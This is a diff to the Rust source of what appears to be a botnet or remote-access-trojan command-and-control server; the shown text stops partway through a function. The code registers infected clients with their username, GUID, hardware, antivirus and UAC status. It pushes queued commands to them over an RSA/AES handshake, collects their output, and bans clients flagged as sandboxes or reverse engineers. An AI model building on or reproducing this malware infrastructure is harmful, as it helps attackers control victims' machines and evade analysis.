@@ -1,4 +1,3 @@
-extern crate openssl;
 extern crate colored; 
 
 use actix_web::{
@@ -17,21 +16,22 @@ use std::{
 
 };
 
-use openssl::{
-    error::ErrorStack,
-    base64::{decode_block, encode_block},
-    symm::{Cipher, Crypter, Mode},
-
-};
-
 use rsa::{
-    {Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey},
-    pkcs1::{DecodeRsaPrivateKey, EncodeRsaPrivateKey},
-    pkcs1::EncodeRsaPublicKey
+    pkcs1::{
+        DecodeRsaPrivateKey, 
+        EncodeRsaPrivateKey, 
+        EncodeRsaPublicKey
+    }, 
+    Pkcs1v15Encrypt, 
+    RsaPrivateKey, 
+    RsaPublicKey
 };
+
+use base64::prelude::*;
+use crypto::{ symmetriccipher, buffer, aes, blockmodes };
+use crypto::buffer::{ ReadBuffer, WriteBuffer, BufferResult };
 
 use mysql_async::{*, prelude::*};
-use randomizer::{Charset, Randomizer};
 
 use colored::Colorize;
 use random_string::generate;
@@ -48,7 +48,7 @@ use flate2::write::GzEncoder;
 use flate2::read::GzDecoder;
 
 use argon2::{
-    ParamsBuilder, Params,
+    ParamsBuilder,
     password_hash::{
         rand_core::OsRng,
         PasswordHash, PasswordHasher, PasswordVerifier, SaltString
@@ -56,9 +56,14 @@ use argon2::{
     Argon2
 };
 
+use itertools::Itertools;
+use rand::RngCore;
+use rand::seq::SliceRandom;
+
 
 lazy_static! {
     static ref CONNECTION_INTERVAL: Arc<RwLock<u64>> = Arc::new(RwLock::new(0));
+    static ref PURGATORY_INTERVAL: Arc<RwLock<u64>> = Arc::new(RwLock::new(0));
     static ref ENABLE_FIREWALL: Arc<RwLock<bool>> = Arc::new(RwLock::new(false));
     static ref API_SECRET: Arc<RwLock<String>> = Arc::new(RwLock::new(String::from("root")));
     static ref CONNECTION_POOL: Arc<RwLock<Pool>> = Arc::new(RwLock::new(Pool::from_url("mysql://unknown:unknown@1.1.1.1:1000/database").unwrap()));
@@ -85,192 +90,418 @@ enum GenericError {
 #[post("/gateway")]
 async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
 
-    let mut connection: Conn = obtain_connection().await;
+    const HANDSHAKE_P1: usize = 1;
+    const HANDSHAKE_P2: usize = 2;
+    const CLIENT_ID_LENGTH: usize = 16;
+
     let connection_interval = *CONNECTION_INTERVAL.read().unwrap();
     let enable_firewall = *ENABLE_FIREWALL.read().unwrap();
+
+    let mut connection: Conn = obtain_connection().await;
     let ip: String = req.peer_addr().unwrap().ip().to_string();
 
-    if req_body.len() < 16 { return resp_badrequest(); }
-    let client_id = String::from(&req_body[0..16]);
-    let encryption_key = get_encryption_key(&mut connection, &client_id).await;
-    
-    match encryption_key {
-        Ok(_) => (),
-        Err(GenericError::_Expired) => {
-            block_client(&mut connection, "N/A", "Request sent with expired encryption key.", &ip, 1200).await;
-            drop(connection); return resp_unauthorised();
-        },
-        Err(_) => {
-            
-            let parts: Vec<&str> = req_body.split("|").collect::<Vec<&str>>();
-            let client_bytes = (*PRIVATE_KEY.read().unwrap()).decrypt(Pkcs1v15Encrypt, &decode_block(parts[1]).unwrap());
+    if is_client_blocked(&mut connection, "N/A", &ip).await {
+        fprint("restricted", &format!("{} tried sending a request while blocked.", ip));
+        return resp_unauthorised();
+    }
 
-            match client_bytes {
-                Ok(_) => (),
-                Err(_) => {
-                    fprint("error", "Client sent a registration request encrypted with the wrong RSA key.");
-                    drop(connection); return resp_badrequest();
+    let split_body: Vec<&str> = req_body.split(".").collect(); // 0 will always be non-json, either AES key or Client bytes. 1 will either be nothing or json.
+
+    // Modfiy server to generate a "next" byte sequence and store it in the client DB for that client id.
+    // If the encrypted message doesn't contain this "next" byte sequence, or the "next" byte sequence is incorrect,
+    // the request is being replayed. Block that client forever.
+
+         
+    match split_body.len() {
+        HANDSHAKE_P2 => {
+
+            if split_body[0].len() == CLIENT_ID_LENGTH && is_client(&mut connection, split_body[0]).await {
+                let client_id = split_body[0];
+
+                if enable_firewall && !(get_last_seen(&mut connection, &client_id).await + (connection_interval * 3/4) < get_timestamp()) {
+                    block_client(&mut connection, &client_id, "Sending too many requests as a registered client.", &ip, 1200).await;
+                    return resp_unauthorised();
                 }
-            }; 
-            
-            let client_bytes = client_bytes.unwrap();
-            let json: serde_json::Value = serde_json::from_str(str::from_utf8(&decrypt_string_withkey(parts[0], &client_bytes).await.unwrap()).unwrap()).expect("erm");
-            let server_bytes = Randomizer::new(32, Some(Charset::AnyByte)).bytes().unwrap();
 
-            // Key formatted like this: (encryption key).(time (past this, key is invalid))
-            let encryption_key = format!(
-                "{}.{}", 
-                &sha256::digest([client_bytes.clone(), server_bytes.clone()].concat())[..32], 
-                get_timestamp() + connection_interval
-            );
-
-            if !all_keys_valid(
-                &json, 
-                vec!["version", "uac", "username", "guid", "cpu", "gpu", "ram", "antivirus", "path", "pid", "client_bytes"],
-                vec!["u64", "bool", "String", "String", "String", "String", "u64", "String", "String", "u64", "string"]
-            ) {
-                fprint("error", "Client sent a malformed registration request. They've been blocked for 20 minutes.");
-                drop(connection); return resp_badrequest();
-            }
-
-            // Client ID is constructed from GUID, Version, and Username. If any of these values change a new client ID is fabricated.
-            let client_id = String::from(&sha256::digest(format!("{}{}{}{}", 
-                key_to_string(&json, "guid"), 
-                key_to_u64(&json, "version"), 
-                key_to_string(&json, "username"),
-                &*API_SECRET.read().unwrap()
-            ))[..16]);
-
-            // This prevents clients that have blocked IPs from sending registration requests to the server.
-            if is_client_blocked(&mut connection, &client_id, &ip).await {
-                fprint("failure", &format!("({}) {} tried to send a request whilst blocked.", ip.red(), client_id.red()));
-                drop(connection); return resp_unauthorised();
-            }
-
-            if is_client(&mut connection, &client_id).await {
-                // Maybe remove this fraction.
-                if get_last_seen(&mut connection, &client_id).await + (connection_interval * 3/4) < get_timestamp() {
-
-                    // If client took longer than 45 seconds to send a request.
-                    let update_clients_sql: std::result::Result<Vec<String>, Error> = connection.exec(
-                        r"UPDATE clients SET uac = :uac, ip = :ip, country = :country, cpu = :cpu, gpu = :gpu, ram = :ram, antivirus = :antivirus, path = :path, pid = :pid, last_seen = :last_seen, encryption_key = :encryption_key WHERE client_id = :client_id",
-                        params! {
-                            "uac" => key_to_bool(&json, "uac"),
-                            "ip" => &ip,
-                            "country" => ip_to_country(&ip).await,
-                            "cpu" => key_to_string(&json, "cpu"),
-                            "gpu" => key_to_string(&json, "gpu"),
-                            "ram" => key_to_u64(&json, "ram"),
-                            "antivirus" => key_to_string(&json, "antivirus"),
-                            "path" => key_to_string(&json, "path"),
-                            "pid" => key_to_u64(&json, "pid"),
-                            "last_seen" => get_timestamp(),
-                            "client_id" => &client_id,
-                            "encryption_key" => &encryption_key
-                        }
-                    ).await;
-
-                    match update_clients_sql {
-                        Ok(_) => (),
-                        Err(e) => fprint("error", &format!("Unable to update client data: {}", e))
-                    };
-                    
-                    fprint("success", &format!("({}) {} has reconnected after being offline.", &ip.yellow(), client_id.yellow()));
-                    update_last_seen(&mut connection, &client_id).await;        
-
-                } else {
-                    // If client took longer than 45s
-
+                if is_client_blocked(&mut connection, client_id, &ip).await {
+                    fprint("restricted", &format!("({}) {} tried doing an action while blocked.", &ip, &client_id));
+                    return resp_unauthorised();
                 }
-            
-            } else {
 
-                let insert_client_sql: std::result::Result<Vec<String>, Error> = connection.exec(
-                    r"INSERT INTO clients (
-                        client_id, version, uac, ip,
-                        country, 
-                        username, guid, cpu, 
-                        gpu, ram, antivirus, 
-                        path, pid, last_seen, 
-                        first_seen, encryption_key
-                    ) 
-                    
-                    VALUES (
-                        :client_id, :version, :uac, :ip,
-                        :country,
-                        :username, :guid, :cpu,
-                        :gpu, :ram, :antivirus,
-                        :path, :pid, :last_seen,
-                        :first_seen, :encryption_key
-                    )",
-                    params! {
-                        "client_id" => &client_id,
-                        "version" => key_to_u64(&json, "version"),
-                        "uac" => key_to_bool(&json, "uac"),
-                        "ip" => &ip,
-                        "country" => ip_to_country(&ip).await,
-                        "username" => key_to_string(&json, "username"),
-                        "guid" => key_to_string(&json, "guid"),
-                        "cpu" => key_to_string(&json, "cpu"),
-                        "gpu" => key_to_string(&json, "gpu"),
-                        "ram" => key_to_u64(&json, "ram"),
-                        "antivirus" => key_to_string(&json, "antivirus"),
-                        "path" => key_to_string(&json, "path"),
-                        "pid" => key_to_u64(&json, "pid"),
-                        "last_seen" => get_timestamp(),
-                        "first_seen" => get_timestamp(),
-                        "encryption_key" => &encryption_key
+                let encryption_key = match get_encryption_key(&mut connection, client_id).await {
+
+                    Ok(result) => result,
+                    Err(GenericError::_Expired) => {
+                        block_client(&mut connection, "N/A", "Request sent with expired encryption key.", &ip, 1200).await;
+                        return resp_unauthorised();
+                    },
+                    Err(error) => {
+                        fprint("error", &format!("(HANDSHAKE_P2 get_encryption_key): {:?}", error));
+                        return resp_servererror();
                     }
-                ).await;
 
-                match insert_client_sql {
-                    Ok(_) => (),
-                    Err(e) => {
-                        fprint("error", &format!("Unable to insert new client data into db: {}",e));
-                        drop(connection); return resp_servererror();
+                };
+
+                let decrypted_raw_json = match aes_256cbc_decrypt(split_body[1], encryption_key.as_bytes()) {
+                    Ok(result) => result,
+                    Err(_) => {
+                        block_client(&mut connection, "N/A", "Sent a registration request encrypted with the wrong AES key.", &ip, 1200).await;
+                        return resp_badrequest();
+                    }
+                }; 
+
+                let submitted_json: serde_json::Value = match serde_json::from_str(str::from_utf8(&decrypted_raw_json).unwrap()) {
+                    Ok(result) => result,
+                    Err(_) => {
+                        block_client(&mut connection, "N/A", "Sent a registration request without valid JSON.", &ip, 1200).await;
+                        return resp_badrequest();
                     }
                 };
-        
-                fprint("success", &format!("{}", 
-                    format!("({}) {} registered with username {}", 
-                    &ip.yellow(),  
-                    client_id.yellow(), 
-                    key_to_string(&json, "username").yellow()
-                )));
-            }
 
-            // TODO: Change to iter and not first
-            let load_ids = connection.query_map(r"SELECT load_id, cmd_args, cmd_type, is_recursive FROM loads", |row: Row| {
-                (value_to_str(&row, 0), value_to_str(&row, 1), value_to_str(&row, 2), value_to_str(&row, 3))
-            }).await;
+                match key_to_string(&submitted_json, "action").as_str() {
 
-            match load_ids {
-                Ok(_) => (),
-                Err(_) => {
-                    fprint("error", "Unable to fetch load ids.");
+                    "block" => {
+                        block_client(&mut connection, "N/A", &ip, "Reverse engineering attempt or sandbox.", 3155695200).await;
+                        return resp_unauthorised();
+                    },
+
+                    "heartbeat" => {
+                        update_last_seen(&mut connection, &client_id).await;
+                        match get_current_client_command(&mut connection, &client_id).await {
+
+                            Ok((command_id, cmd_args, cmd_type)) => {
+                                return resp_ok_encrypted(&json!({
+                                    "command_id": command_id,
+                                    "cmd_args": BASE64_STANDARD.encode(&parse_storage_read(&cmd_args)),
+                                    "cmd_type": cmd_type
+                                }).to_string(),  encryption_key.as_bytes()).await;
+                            },
+
+                            Err(GenericError::NoRows) => {
+                                return resp_ok_encrypted("Ok", encryption_key.as_bytes()).await;
+                            },
+                            
+                            Err(_) => {
+                                fprint("error", "At gateway (command_info)");
+                                return resp_servererror();
+                            },
+                        }
+                    },
+
+                    "submit_output" => {
+                        if !all_keys_valid(&submitted_json, vec!["command_id", "output"], vec!["String", "String", "String"]) {
+                            block_client(&mut connection, &client_id, "Didn't fill out all fields when submitting output.", &ip, 3155695200).await;
+                            return resp_badrequest();
+                        }
+                
+                        let command_id = key_to_string(&submitted_json, "command_id");
+                        let output_id = generate(8, CHARSET);
+                
+                        // TODO: is_command and get_command_info are basically the same thing, only call to get_command_info.
+
+                        match get_command_info(&mut connection, &command_id).await {
+                            Ok((command_id, cmd_args, cmd_type, time_issued)) => {
+                                match connection.exec_drop(
+                            
+                                    r"INSERT INTO outputs (
+                                    output_id, command_id, 
+                                    client_id, cmd_args, 
+                                    cmd_type, output, 
+                                    time_issued, time_received
+                                    ) VALUES 
+                                    
+                                    ( :output_id, :command_id, 
+                                    :client_id, :cmd_args, 
+                                    :cmd_type, :output, 
+                                    :time_issued, :time_received)",
+                    
+                                    params! {
+                                        "output_id" => &output_id,
+                                        "command_id" => &command_id,
+                                        "client_id" => &client_id,
+                                        "cmd_args" => &cmd_args,
+                                        "cmd_type" => &cmd_type,
+                                        "output" => &parse_storage_write(key_to_string(&submitted_json, "output").as_bytes()),
+                                        "time_issued" => &time_issued,
+                                        "time_received" => get_timestamp(),
+                    
+                                    }
+                                ).await {
+                                    Ok(_) => {
+                                        connection.exec_drop(r"DELETE FROM commands WHERE command_id = :command_id", params! { "command_id" => &command_id }).await.unwrap();
+                                    
+                                        fprint("info", &format!("({}) {} completed command {} with type {}.", &ip, &client_id, &command_id, &cmd_type));
+                                        update_last_seen(&mut connection, &client_id).await;        
+                            
+                                        return resp_ok_encrypted("Submitted output successfully.", encryption_key.as_bytes()).await;
+                                    },
+                                    Err(e) => fprint("error", &format!("Unable to insert output: {}",e))
+                                };
+                            },
+                            Err(_) => {
+                                fprint("failure", &format!("({}) {} tried submitting an output with an invalid command id. No action taken.", ip.red(), client_id.red()));
+                                return resp_badrequest();
+                            }
+                        };
+                    }
+
+                    &_ => {
+                        fprint("error", &format!("({}) {} sent a request containing an unsupported action.", &ip, &client_id));
+                        return resp_unsupported();
+                    }
                 }
-            };
-            
-            for result in load_ids.unwrap() {
-                if is_uncompleted_load(&mut connection, &client_id, &result.0).await || result.3.parse::<bool>().unwrap() {
-                    task_client(&mut connection, &client_id, &result.1, &result.2).await;
-                }   
+
+
+                return resp_ok_encrypted("Well done! Connection succesfully established.", encryption_key.as_bytes()).await;
+            } else {
+
+
+                let decrypted_first_half = match (*PRIVATE_KEY.read().unwrap()).decrypt(Pkcs1v15Encrypt, &BASE64_STANDARD.decode(&split_body[0]).unwrap()) {
+                    Ok(result) => result,
+                    Err(_) => {
+                        block_client(&mut connection, "N/A","Client sent a registration request encrypted with the wrong RSA key.", &ip, 1200).await;
+                        return resp_badrequest();
+                    }
+                }; 
+
+                let provided_encryption_key = str::from_utf8(&decrypted_first_half).unwrap();
+                let purgatory_selection_sql: std::result::Result<QueryResult<'_, '_, _>, Error> = connection.query_iter(r"SELECT encryption_key,expiration_time,request_ip FROM purgatory").await;
+                let selected_purgatory = purgatory_selection_sql.unwrap().collect::<Row<>>().await;
+
+                for row in selected_purgatory.unwrap() {
+                    if value_to_str(&row, 0) == provided_encryption_key {
+
+                        if &value_to_str(&row, 2) != &ip {
+                            block_client(&mut connection, "N/A", "IP which requested hash differs from which submitted it.", &value_to_str(&row, 2), 3155695200).await;
+                            block_client(&mut connection, "N/A", "IP which requested hash differs from which submitted it.", &ip, 3155695200).await;
+                            return resp_badrequest();
+                        }
+                        
+                        if value_to_u64(&row, 1) < get_timestamp() {
+                            block_client(&mut connection, "N/A", "Took to long to solve the hash.", &ip, 1200).await;
+                            return resp_badrequest();
+                        }
+
+                        drop(
+                            connection.exec_drop(r"DELETE FROM purgatory WHERE encryption_key = :encryption_key", 
+                            params! { "encryption_key" => &provided_encryption_key }).await
+                        );
+
+                        let decrypted_raw_json = match aes_256cbc_decrypt(split_body[1], provided_encryption_key.as_bytes()) {
+                            Ok(result) => result,
+                            Err(_) => {
+                                block_client(&mut connection, "N/A", "Sent a registration request encrypted with the wrong AES key.", &ip, 1200).await;
+                                return resp_badrequest();
+                            }
+                        }; 
+
+                        let client_data_json = match serde_json::from_str(str::from_utf8(&decrypted_raw_json).unwrap()) {
+                            Ok(result) => result,
+                            Err(_) => {
+                                block_client(&mut connection, "N/A", "Sent a registration request without valid JSON.", &ip, 1200).await;
+                                return resp_badrequest();
+                            }
+                        };
+
+                        if !all_keys_valid(&client_data_json, 
+                            vec!["version", "uac", "username", "guid", "cpu", "gpu", "ram", "antivirus", "path", "pid", "client_bytes"],
+                            vec!["u64", "bool", "String", "String", "String", "String", "u64", "String", "String", "u64", "string"]
+                        ) {
+                            block_client(&mut connection, "N/A", "Missing one or more JSON keys.", &ip, 1200).await;
+                            return resp_badrequest();
+                        }
+
+                        let client_id = String::from(&sha256::digest(format!("{}{}{}", 
+                            key_to_string(&client_data_json, "guid"), 
+                            key_to_string(&client_data_json, "username"),
+                            &*API_SECRET.read().unwrap()
+                        ))[..16]);
+
+                        if !is_client(&mut connection, &client_id).await {
+                            match connection.exec_drop(
+                                r"INSERT INTO clients (
+                                    client_id, version, uac, ip,
+                                    country, 
+                                    username, guid, cpu, 
+                                    gpu, ram, antivirus, 
+                                    path, pid, last_seen, 
+                                    first_seen, encryption_key,
+                                    key_expiration
+                                ) 
+                                
+                                VALUES (
+                                    :client_id, :version, :uac, :ip,
+                                    :country,
+                                    :username, :guid, :cpu,
+                                    :gpu, :ram, :antivirus,
+                                    :path, :pid, :last_seen,
+                                    :first_seen, :encryption_key,
+                                    :key_expiration
+                                )",
+                                params! {
+                                    "client_id" => &client_id,
+                                    "version" => key_to_u64(&client_data_json, "version"),
+                                    "uac" => key_to_bool(&client_data_json, "uac"),
+                                    "ip" => &ip,
+                                    "country" => ip_to_country(&ip).await,
+                                    "username" => key_to_string(&client_data_json, "username"),
+                                    "guid" => key_to_string(&client_data_json, "guid"),
+                                    "cpu" => key_to_string(&client_data_json, "cpu"),
+                                    "gpu" => key_to_string(&client_data_json, "gpu"),
+                                    "ram" => key_to_u64(&client_data_json, "ram"),
+                                    "antivirus" => key_to_string(&client_data_json, "antivirus"),
+                                    "path" => key_to_string(&client_data_json, "path"),
+                                    "pid" => key_to_u64(&client_data_json, "pid"),
+                                    "last_seen" => get_timestamp(),
+                                    "first_seen" => get_timestamp(),
+                                    "encryption_key" => &provided_encryption_key,
+                                    "key_expiration" => get_timestamp() + connection_interval
+                                }
+                            ).await {
+                                Ok(_) => {
+
+                                    fprint("success", &format!("{}", 
+                                        format!("({}) {} registered with username {}", 
+                                        &ip.yellow(),  
+                                        client_id.yellow(), 
+                                        key_to_string(&client_data_json, "username").yellow()
+                                    )));
+
+                                    return resp_ok_encrypted(&client_id, provided_encryption_key.as_bytes()).await;
+                                },
+                                Err(e) =>  {
+                                    fprint("error", &format!("Unable to insert new client data into db: {}",e));
+                                    return resp_servererror();
+                                }
+                            };
+                        }
+
+                        // Code below here runs if it's already a client.
+
+                        if get_last_seen(&mut connection, &client_id).await + (connection_interval * 3/4) < get_timestamp() {
+                            match connection.exec_drop(
+                                r"UPDATE clients SET uac = :uac, ip = :ip, country = :country, cpu = :cpu, gpu = :gpu, ram = :ram, antivirus = :antivirus, path = :path, pid = :pid, last_seen = :last_seen, encryption_key = :encryption_key, key_expiration = :key_expiration WHERE client_id = :client_id",
+                                params! {
+                                    "uac" => key_to_bool(&client_data_json, "uac"),
+                                    "ip" => &ip,
+                                    "country" => ip_to_country(&ip).await,
+                                    "cpu" => key_to_string(&client_data_json, "cpu"),
+                                    "gpu" => key_to_string(&client_data_json, "gpu"),
+                                    "ram" => key_to_u64(&client_data_json, "ram"),
+                                    "antivirus" => key_to_string(&client_data_json, "antivirus"),
+                                    "path" => key_to_string(&client_data_json, "path"),
+                                    "pid" => key_to_u64(&client_data_json, "pid"),
+                                    "last_seen" => get_timestamp(),
+                                    "client_id" => &client_id,
+                                    "encryption_key" => &provided_encryption_key,
+                                    "key_expiration" => get_timestamp() + connection_interval
+                                }
+                            ).await {
+                                Ok(_) => {
+                                    fprint("success", &format!("{}", 
+                                        format!("({}) {} with username {} reconnected.", 
+                                        &ip.yellow(),  
+                                        client_id.yellow(), 
+                                        key_to_string(&client_data_json, "username").yellow()
+                                    )));
+
+                                    update_last_seen(&mut connection, &client_id).await;        
+                                    return resp_ok_encrypted(&client_id, provided_encryption_key.as_bytes()).await;
+                                },
+                                Err(e) => {
+                                    fprint("error", &format!("Unable to update client data: {}", e));
+                                    return resp_servererror();
+                                }
+                            };
+        
+                        } else {
+                            block_client(&mut connection, &client_id, "Re-registering too quickly.", &ip, 1200).await;
+                            return resp_servererror();
+                        }
+
+                    };                            
+                }
             }
-            drop(connection); return resp_ok_encrypted(&json!({
-                "client_id": &client_id,
-                "server_bytes": encode_block(&server_bytes)
+        }
+            
+
+        // Part of handshake where we issue the hash that the client needs to crack
+        HANDSHAKE_P1 => {
+
+
+            let decrypted_first_half = match (*PRIVATE_KEY.read().unwrap()).decrypt(Pkcs1v15Encrypt, &BASE64_STANDARD.decode(&split_body[0]).unwrap()) {
+                Ok(result) => result,
+                Err(_) => {
+                    block_client(&mut connection, "N/A","Client sent a registration request encrypted with the wrong RSA key.", &ip, 1200).await;
+                    return resp_badrequest();
+                }
+            }; 
+
+            let client_bytes = decrypted_first_half;
+            
+            let items = random_bytes(8);
+            let mut all_bytes: Vec<Vec<u8>> = vec![];
+
+            for perm in items.iter().permutations(items.len()).unique() {
+                let mut temp = vec![];
+                for byte in perm { temp.push(*byte); }
+                all_bytes.push(temp);
+            }
+            
+            let server_bytes: &Vec<u8> = all_bytes.choose(&mut rand::thread_rng()).unwrap();
+            let client_seed: &Vec<u8> =  all_bytes.choose(&mut rand::thread_rng()).unwrap();
+
+            let server_bytes_hash = argon2_hash(&server_bytes.as_slice());
+        
+            let encryption_key = format!("{}", 
+                &sha256::digest([client_bytes.clone(), server_bytes.clone()].concat())[..32]
+            );
+
+            fprint("info", &format!("Encryption key generated for the client: {}", &encryption_key));
+
+            match connection.exec_drop(
+            
+                r"INSERT INTO purgatory (
+                    encryption_key, expiration_time, request_ip
+                ) VALUES 
+                
+                ( :encryption_key, :expiration_time, :request_ip )",
+
+                params! {
+                    "encryption_key" => &encryption_key,
+                    "expiration_time" => &get_timestamp() + *CONNECTION_INTERVAL.read().unwrap(),
+                    "request_ip" => &ip
+
+                }
+            ).await {
+                Ok(_) => (),
+                Err(e) => fprint("error", &format!("Failed to insert key into purgatory: {}", e))
+            };
+
+            return resp_ok_encrypted(&json!({
+                "server_hash": server_bytes_hash,
+                "seed": BASE64_STANDARD.encode(&client_seed)
             }).to_string(), &client_bytes).await;
-        },
+
+        }
+        _ => {
+            fprint("error", "Too many or too little splits in the message. Might be network error, ignoring.");
+            return resp_servererror()
+        }
     };
 
+    block_client(&mut connection, "N/A", "Sending malformed requests or sending too quickly.", &ip, 1200).await;
+    return resp_unauthorised();
+
+    /* 
     let encryption_key = encryption_key.unwrap();
-    let decrypted_body = decrypt_string_withkey(&req_body[16..], &encryption_key.as_bytes()).await;
+    let decrypted_body = aes_256cbc_decrypt(&req_body[16..], &decrypted_first_half).await;
 
     match decrypted_body {
         Ok(_) => (),
         Err(_) => {
             block_client(&mut connection, &client_id, "Unable to decrypt information sent by client.", &ip, 1200).await;
-            drop(connection); return resp_unauthorised();
+            return resp_unauthorised();
         }
     }
 
@@ -278,62 +509,28 @@ async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
 
     if !key_exists(&json, "action") {
         block_client(&mut connection, "Sent malformed request, no action provided.", &client_id, &ip, 1200).await;
-        drop(connection); return resp_unauthorised();
+        return resp_unauthorised();
         
     } 
 
     else if key_to_string(&json, "action") == "block" {
         block_client(&mut connection, "N/A", &ip, "Reverse engineering attempt, or sandbox.", 3155695200).await;
-        drop(connection); return resp_unauthorised();
+        return resp_unauthorised();
 
     } else if key_to_string(&json, "action") == "heartbeat" { 
 
         // If the client is banned, we will go to the else. If it isn't, we will update the last seen time.
-        if !is_client_blocked(&mut connection, &client_id, &ip).await {
-
-            if !(get_last_seen(&mut connection, &client_id).await + (connection_interval * 3/4) < get_timestamp()) && enable_firewall {
-                block_client(&mut connection, &client_id, "Sending an irregular number of re-registrations.", &ip, 1200).await;
-                drop(connection); return resp_unauthorised();
-                
-            }
-          
-            update_last_seen(&mut connection, &client_id).await;        
-
-            let command_info: std::result::Result<(String, String, String), GenericError> = get_current_client_command(&mut connection, &client_id).await;
-           
-            match command_info {
-                Ok(_) => (),
-                Err(GenericError::NoRows) => {
-                    drop(connection); return resp_ok_encrypted("Ok", encryption_key.as_bytes()).await;
-                },
-                Err(_) => {
-                    fprint("error", "At gateway (command_info)");
-                    drop(connection); return resp_servererror();
-                },
-            }
-            
-            let (command_id, cmd_args, cmd_type) = command_info.unwrap();
-
-            drop(connection); return resp_ok_encrypted(&json!({
-                "command_id": command_id,
-                "cmd_args": cmd_args,
-                "cmd_type": cmd_type
-            }).to_string(),  encryption_key.as_bytes()).await;
-
-        } else {
-            fprint("failure", &format!("({}) {} tried sending a heartbeat with an invalid client id. No action taken.", ip.red(), client_id.red()));
-            drop(connection); return resp_unauthorised();
-        }
+ 
 
     } else if key_to_string(&json, "action") == "submit_output" {
 
         if !all_keys_valid(&json, vec!["command_id", "output"], vec!["String", "String", "String"]) {
             block_client(&mut connection, &client_id, "Didn't fill out all fields when submitting output.", &ip, 3155695200).await;
-            drop(connection); return resp_badrequest();
+            return resp_badrequest();
         }
 
         let command_id = key_to_string(&json, "command_id");
-        let output_id = generate(8, "abcdef123456789");
+        let output_id = generate(8, CHARSET);
 
         // TODO: is_command and get_command_info are basically the same thing, only call to get_command_info.
         
@@ -381,16 +578,18 @@ async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
             fprint("info", &format!("({}) {} completed command {} with type {}.", &ip, &client_id, &command_id, &cmd_type));
             update_last_seen(&mut connection, &client_id).await;        
 
-            drop(connection); return resp_ok_encrypted("Submitted output successfully.", encryption_key.as_bytes()).await;
+            return resp_ok_encrypted("Submitted output successfully.", encryption_key.as_bytes()).await;
         } else {
             fprint("failure", &format!("({}) {} tried submitting an output with an invalid command id. No action taken.", ip.red(), client_id.red()));
-            drop(connection); return resp_badrequest();
+            return resp_badrequest();
         }
 
     } else {
         block_client(&mut connection, &client_id, "Didn't provide a valid action.", &ip, 3155695200).await;
-        drop(connection); return resp_badrequest();
+        return resp_badrequest();
     }
+
+    */
 }
 
 
@@ -403,10 +602,10 @@ async fn api_issue_load(req_body: String) -> impl Responder {
     if key_to_string(&json, "api_secret") == api_secret {
 
         let mut connection: Conn = obtain_connection().await;
-        let load_id = generate(8, CHARSET);
         let parsed_cmd_args = &parse_storage_write(key_to_string(&json, "cmd_args").as_bytes());
+        let load_id: String = generate(8, CHARSET);
 
-        let load_insert_sql: std::result::Result<Vec<String>, Error> = connection.exec(  
+        match connection.exec_drop(  
             r"INSERT INTO loads (
                 load_id, required_amount, cmd_args, 
                 is_recursive, cmd_type, 
@@ -424,18 +623,16 @@ async fn api_issue_load(req_body: String) -> impl Responder {
                 "is_recursive" => key_to_bool(&json, "is_recursive"),
                 "time_issued" => get_timestamp(),
             }
-        ).await;
-    
-        match load_insert_sql {
+        ).await {
             Ok(_) => (),
             Err(e) => fprint("error", &format!("Unable to insert data into load: {}",e)), 
         }
 
         let is_recursive_text;
         if key_to_bool(&json, "is_recursive") {
-            is_recursive_text = "is_recursive";
+            is_recursive_text = "Recursive";
         } else {
-            is_recursive_text = "Non-is_recursive";
+            is_recursive_text = "Non-recursive";
         }
 
         task_all_clients(&parsed_cmd_args, &key_to_string(&json, "cmd_type"), &load_id).await;
@@ -444,7 +641,7 @@ async fn api_issue_load(req_body: String) -> impl Responder {
             is_recursive_text.yellow(), key_to_string(&json, "cmd_type"), parsed_cmd_args.yellow()
         ));
 
-        drop(connection); return resp_ok(load_id);
+        return resp_ok(load_id);
     } else {
         fprint("failure", &format!("Request was sent to /api/issue without authentication."));
         return resp_unauthorised();
@@ -462,20 +659,17 @@ async fn api_blocks_list(req_body: String) -> impl Responder {
     if key_to_string(&json, "api_secret") == api_secret {
 
         let mut connection: Conn = obtain_connection().await;
-        let block_selection_sql = connection.query_iter(r"SELECT * FROM blocks").await;
     
-        match block_selection_sql {
-            Ok(_) => (),
+        let mut block_selection = match connection.query_iter(r"SELECT * FROM blocks").await {
+            Ok(result) => result,
             Err(_) => {
                 fprint("error", "(block_selection_sql) Unable to fetch client list");
-                drop(connection); return resp_servererror();
+                return resp_servererror();
             }, 
         };
 
-        let selected_blocks = block_selection_sql.unwrap().collect::<Row<>>().await;
-        let mut json_blocks_list = json!({});
-      
-        for row in selected_blocks.unwrap() {
+        let mut json_blocks_list = json!({});   
+        for row in block_selection.collect::<Row<>>().await.unwrap() {
 
             json_blocks_list[value_to_str(&row, 0)] = json!(
                 {
@@ -487,7 +681,7 @@ async fn api_blocks_list(req_body: String) -> impl Responder {
             );            
         }
 
-        drop(connection); return resp_ok(json_blocks_list.to_string());
+        return resp_ok(json_blocks_list.to_string());
     } else {
         fprint("failure", &format!("Request was sent to /api/blocks_list without authentication."));
         return resp_unauthorised();
@@ -504,25 +698,23 @@ async fn api_remove_block(req_body: String) -> impl Responder {
         let mut connection: Conn = obtain_connection().await;
 
         if is_block(&mut connection, &key_to_string(&json, "block_id")).await {
-
-            let block_removal_sql = connection.exec_drop(
+        
+            match connection.exec_drop(
                 r"DELETE FROM blocks WHERE block_id = :block_id;",  
                 params! {
                     "block_id" => key_to_string(&json, "block_id"),
                 }
-            ).await;
-        
-            match block_removal_sql {
+            ).await {
                 Ok(_) => (),
                 Err(e) => {
                     fprint("error", &format!("(block_removal_sql) Unable to remove load: {}", e));
-                    drop(connection); return resp_servererror();
+                    return resp_servererror();
                 }, 
             };
 
-            drop(connection); return resp_ok(String::from("Successfully removed block."));
+            return resp_ok(String::from("Successfully removed block."));
         } else {
-            drop(connection); return resp_badrequest();
+            return resp_badrequest();
         }
     } else {
         fprint("failure", &format!("Request was sent to /api/remove_load without authentication."));
@@ -539,21 +731,19 @@ async fn api_clients_list(req_body: String) -> impl Responder {
     if key_to_string(&json, "api_secret") == api_secret {
 
         let mut connection: Conn = obtain_connection().await;
-        let client_selection_sql = connection.query_iter(r"SELECT * FROM clients").await;
         let connection_interval = *CONNECTION_INTERVAL.read().unwrap();
     
-        match client_selection_sql {
-            Ok(_) => (),
+        let mut client_selection = match connection.query_iter(r"SELECT * FROM clients").await {
+            Ok(result) => result,
             Err(_) => {
                 fprint("error", "(client_selection_sql) Unable to fetch client list");
